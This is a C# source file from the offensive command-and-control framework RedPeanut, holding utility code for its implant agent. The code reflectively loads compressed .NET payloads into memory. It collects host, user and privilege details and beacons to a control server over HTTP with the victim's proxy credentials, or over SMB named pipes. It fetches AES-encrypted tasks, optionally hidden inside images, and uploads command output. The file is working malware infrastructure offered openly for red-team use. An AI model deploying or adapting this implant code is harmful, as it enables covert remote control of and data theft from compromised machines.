//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Web.Script.Serialization;

namespace RedPeanutAgent.Core
{
    class Utility
    {
        public static string GetPipeName(int pid)
        {
            string pipename = Dns.GetHostName();
            pipename += pid.ToString();
            return pipename;

        }

        public static byte[] getPayload(string payload)
        {

            return DecompressDLL(Convert.FromBase64String(payload));
        }

        public static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }


        public static void RunAssembly(string resname, string type, string method, object[] args)
        {
            System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(getPayload(resname));
            Type assemblyType = assembly.GetType(type);
            object assemblyObject = Activator.CreateInstance(assemblyType);

            assemblyType.InvokeMember(method, System.Reflection.BindingFlags.InvokeMethod | System.Reflection.BindingFlags.Static |
                System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.IgnoreReturn, null, assemblyObject, args);
        }



        public class CookiedWebClient : WebClient
        {
            public CookiedWebClient()
            {
                CookieContainer = new CookieContainer();
                this.ResponseCookies = new CookieCollection();
            }

            public CookieContainer CookieContainer { get; private set; }
            public CookieCollection ResponseCookies { get; set; }

            public void Add(Cookie cookie)
            {
                this.CookieContainer.Add(cookie);
            }

            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = (HttpWebRequest)base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }

            protected override WebResponse GetWebResponse(WebRequest request)
            {
                var response = (HttpWebResponse)base.GetWebResponse(request);
                this.ResponseCookies = response.Cookies;
                return response;
            }
        }

        //AES
        public static void SendOutputHttp(string taskinstance, string output, CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string rpaddress, string param, string agentid, string agentpivot = null)
        {
            ResponseMsg respmsg = new ResponseMsg
            {
                TaskInstanceid = taskinstance,
                Chunked = false,
                Agentid = agentid,
                Number = 1,
                Data = output
            };

            if (agentpivot != null)
                respmsg.AgentPivot = agentpivot;


            string respmsgjson = new JavaScriptSerializer().Serialize(respmsg);
            //string respmsgjson = JsonConvert.SerializeObject(respmsg, Formatting.Indented);
            var response = Crypto.Aes.EncryptAesMessage(respmsgjson, aeskey, aesiv);

            string post = String.Format("{0}={1}", param, Convert.ToBase64String(response));

            wc.UseDefaultCredentials = true;
            wc.Proxy = WebRequest.DefaultWebProxy;
            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            string resp = wc.UploadString(rpaddress, post);
        }

        //AES
        public static void SendOutputSMB(string output, byte[] aeskey, byte[] aesiv, NamedPipeClientStream pipe)
        {
            ResponseMsg respmsg = new ResponseMsg();
            respmsg.Chunked = false;
            int chunksize = 1024;
            //Response need to be splitted
            if (output.Length > chunksize)
                respmsg.Chunked = true;

            //Chunk number
            int chunknum = output.Length / chunksize;
            if (output.Length % chunksize != 0)
                chunknum++;

            respmsg.Number = chunknum;

            int iter = 0;
            do
            {
                int remaining = output.Length - (iter * chunksize);
                if (remaining > chunksize)
                    remaining = chunksize;

                respmsg.Data = output.Substring(iter * chunksize, remaining);

                string responsechunkmsg = new JavaScriptSerializer().Serialize(respmsg);
                var responsechunk = Crypto.Aes.EncryptAesMessage(responsechunkmsg, aeskey, aesiv);

                pipe.Write(responsechunk, 0, responsechunk.Length);

                iter++;
            }
            while (chunknum > iter);
        }

        //AES
        public static void SendCheckinHttp(string agentid, byte[] aeskey, byte[] aesiv, string rpaddress, string param, CookiedWebClient wc)
        {
            //Collect system info
            SystemInfo sinfo = GetSystemInfo();
            CheckInMsg msg = new CheckInMsg();

            msg.agentid = agentid;
            msg.systeminfo = sinfo;

            string checkinmsg = new JavaScriptSerializer().Serialize(msg);
            //string checkinmsg = JsonConvert.SerializeObject(msg, Formatting.Indented);
            var checkinmsgenc = Crypto.Aes.EncryptAesMessage(checkinmsg, aeskey, aesiv);

            string post = String.Format("{0}={1}", param, Convert.ToBase64String(checkinmsgenc));

            wc.UseDefaultCredentials = true;
            wc.Proxy = WebRequest.DefaultWebProxy;
            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            string resp = wc.UploadString(rpaddress, post);
            string respjson = Crypto.Aes.DecryptAesMessage(Convert.FromBase64String(resp), aeskey, aesiv);
        }

        public static void SendCheckinSMB(string agentid, byte[] aeskey, byte[] aesiv, NamedPipeClientStream pipe)
        {
            //Collect system info
            SystemInfo sinfo = GetSystemInfo();
            CheckInMsg msg = new CheckInMsg();

            msg.agentid = agentid;
            msg.systeminfo = sinfo;
            string checkinmsg = new JavaScriptSerializer().Serialize(msg);
            var response = Crypto.Aes.EncryptAesMessage(checkinmsg, aeskey, aesiv);
            pipe.Write(response, 0, response.Length);

            string respdecr = Crypto.Aes.DecryptAesMessage(ReadMessage(pipe), aeskey, aesiv);
        }

        public static byte[] ReadMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }

        public static AgentIdMsg GetAgentId(string json)
        {
            AgentIdMsg task = new AgentIdMsg();
            try
            {
                task = new JavaScriptSerializer().Deserialize<AgentIdMsg>(json);
                //task = JsonConvert.DeserializeObject<AgentIdMsg>(json);
            }
            catch (Exception)
            {
            }

            return task;
        }

        public static TaskMsg GetTaskHttp(CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string rpaddress, string targetclass, bool isCovered)
        {

            wc.UseDefaultCredentials = true;
            wc.Proxy = WebRequest.DefaultWebProxy;
            wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            string resp = wc.DownloadString(rpaddress);

            if (!string.IsNullOrEmpty(resp))
            {
                if (isCovered)
                {
                    string baseurl = rpaddress.Substring(0, rpaddress.LastIndexOf('/'));
                    resp = Encoding.Default.GetString(ImageLoader.ImageLoader.Load(baseurl, rpaddress, resp, wc, targetclass));
                }
                var line = Crypto.Aes.DecryptAesMessage(Convert.FromBase64String(resp), aeskey, aesiv);

                TaskMsg task = null;
                try
                {
                    task = new JavaScriptSerializer().Deserialize<TaskMsg>(line);
                    //task = JsonConvert.DeserializeObject<TaskMsg>(line);
                }
                catch (Exception)
                {
                }

                return task;
            }
            else
            {
                return null;
            }

        }

        public static TaskMsg GetTaskSMB(byte[] aeskey, byte[] aesiv, NamedPipeClientStream pipe)
        {

            var messageBytes = ReadMessage(pipe);
            var line = Crypto.Aes.DecryptAesMessage(messageBytes, aeskey, aesiv);
            //Console.WriteLine("[*] Received: {0}", line);

            TaskMsg task = new TaskMsg();
            try
            {
                task = new JavaScriptSerializer().Deserialize<TaskMsg>(line);
            }
            catch (Exception)
            {
            }

            return task;

        }

        public static SystemInfo GetSystemInfo()
        {
            SystemInfo sysinfo = new SystemInfo
            {
                HostName = Dns.GetHostName()
            };
            sysinfo.Ip = Dns.GetHostAddresses(sysinfo.HostName)[0].ToString();

            foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    sysinfo.Ip = a.ToString();
                    break;
                }
            }

            sysinfo.Os = Environment.OSVersion.ToString();
            sysinfo.ProcessName = Process.GetCurrentProcess().ProcessName;

            string Integrity = "Medium";
            if (Environment.UserName.ToLower() == "system")
            {
                Integrity = "System";
            }
            else
            {
                var identity = WindowsIdentity.GetCurrent();
                if (identity.Owner != identity.User)
                {
                    Integrity = "High";
                }
            }

            sysinfo.Integrity = Integrity;
            sysinfo.User = Environment.UserDomainName + "\\" + Environment.UserName;

            return sysinfo;
        }

        public class EndOfLifeException : Exception
        {
            public EndOfLifeException()
            {
            }

            public EndOfLifeException(string message)
                : base(message)
            {
            }

            public EndOfLifeException(string message, Exception inner)
                : base(message, inner)
            {
            }
        }

        public class SystemInfo
        {
            public string Os { get; set; }
            public string Arch { get; set; }
            public string Ip { get; set; }
            public string HostName { get; set; }
            public string Integrity { get; set; }
            public string User { get; set; }
            public string ProcessName { get; set; }
        }

        public class AgentIdMsg
        {
            public string agentid { get; set; }
            public string sessionkey { get; set; }
            public string sessioniv { get; set; }
            public string stage { get; set; }
        }

        public class AgentIdReqMsg
        {
            public string AgentPivot { get; set; }
            public string address { get; set; }
            public int port { get; set; }
            public string request { get; set; }
        }

        public class CheckInMsg
        {
            public string AgentPivot { get; set; }
            public string agentid { get; set; }
            public SystemInfo systeminfo { get; set; }
        }

        public class ModuleConfig
        {
            public string Moduleclass { get; set; }
            public string Method { get; set; }
            public string[] Parameters { get; set; }
            public string Assembly { get; set; }
        }

        public class CommandConfig
        {
            public string Command { get; set; }
            public string[] Parameters { get; set; }
        }

        public class StandardConfig
        {
            public string Moduleclass { get; set; }
            public string Method { get; set; }
            public string[] Parameters { get; set; }
            public string Assembly { get; set; }
        }

        public class FileDownloadConfig
        {
            public string FileNameDest { get; set; }
            public string Moduleclass { get; set; }
            public string Method { get; set; }
            public string[] Parameters { get; set; }
            public string Assembly { get; set; }
        }

        public class TaskMsg
        {
            public string Agentid { get; set; }
            public string Instanceid { get; set; }
            public string AgentPivot { get; set; }
            public string TaskType { get; set; }
            public bool Chunked { get; set; }
            public int ChunkNumber { get; set; }
            public ModuleConfig ModuleTask { get; set; }
            public CommandConfig CommandTask { get; set; }
            public StandardConfig StandardTask { get; set; }
            public FileDownloadConfig DownloadTask { get; set; }
        }

        public class ResponseMsg
        {
            public string Agentid { get; set; }
            public string AgentPivot { get; set; }
            public string TaskInstanceid { get; set; }
            public bool Chunked { get; set; }
            public int Number { get; set; }
            public string Data { get; set; }
        }
    }
}
